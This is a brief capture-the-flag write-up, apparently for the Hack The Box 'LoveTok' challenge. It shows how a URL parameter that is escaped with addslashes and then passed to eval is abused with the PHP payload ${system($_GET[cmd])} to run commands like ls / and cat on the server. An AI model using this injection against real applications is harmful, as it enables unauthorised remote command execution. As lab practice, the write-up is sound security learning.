# LoveTok

a website that has an exposed input on the url bar

![image](https://github.com/IcariZ/HTB/assets/89731969/65de2bc4-fd42-4a21-b59e-6472660e44f3)

tempering the parameter, we found that we can give any input string we want.
![image](https://github.com/IcariZ/HTB/assets/89731969/c085d7e2-07ed-4014-9631-0d1b25c960aa)

from the source code, anything that is in format is being process by giving slashes to prevent some malicious input
then being executed in eval statement

we can use this to get a shell

let's try to spawn shell with ``${system($_GET[cmd])}&cmd=pwd``

![image](https://github.com/IcariZ/HTB/assets/89731969/d07d1747-fb7a-4582-b0b8-c96138057aac)

then locate the flag with ``cmd=ls /``
![image](https://github.com/IcariZ/HTB/assets/89731969/65a3f771-6975-492f-8e5f-cb1712d0b650)

finally ``cmd=cat /flagbMxKo``
